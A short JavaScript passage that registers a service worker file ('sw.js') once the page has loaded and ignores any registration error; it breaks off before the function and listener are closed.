   window.addEventListener("load", () => {
     navigator.serviceWorker.register("sw.js").catch(() => {});
